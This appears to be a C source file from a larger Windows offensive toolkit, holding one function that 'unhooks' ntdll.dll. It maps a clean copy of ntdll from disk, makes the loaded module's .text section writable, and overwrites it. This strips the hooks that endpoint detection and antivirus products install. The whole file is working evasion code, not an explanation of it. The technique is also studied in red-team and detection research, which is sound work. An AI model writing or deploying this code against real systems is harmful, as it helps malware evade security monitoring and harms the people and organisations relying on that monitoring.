#include "../../include/common.h"

bool UnhookNtdll() {
    // Get ntdll base address
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    // Open clean ntdll from disk
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", 
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return false;
    }

    LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    // Parse PE headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hNtdll + pDosHeader->e_lfanew);
    
    // Find .text section
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)(
            (LPBYTE)IMAGE_FIRST_SECTION(pNtHeaders) + (i * sizeof(IMAGE_SECTION_HEADER))
        );
        
        if (strcmp((char*)pSection->Name, ".text") == 0) {
            DWORD oldProtect;
            LPVOID pTextSection = (LPVOID)((LPBYTE)hNtdll + pSection->VirtualAddress);
            
            if (VirtualProtect(pTextSection, pSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                // Copy clean .text section
                memcpy(pTextSection, 
                    (LPVOID)((LPBYTE)pMapping + pSection->VirtualAddress), 
                    pSection->Misc.VirtualSize);
                
                VirtualProtect(pTextSection, pSection->Misc.VirtualSize, oldProtect, &oldProtect);
            }
            break;
        }
    }

    UnmapViewOfFile(pMapping);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    
    return true;
}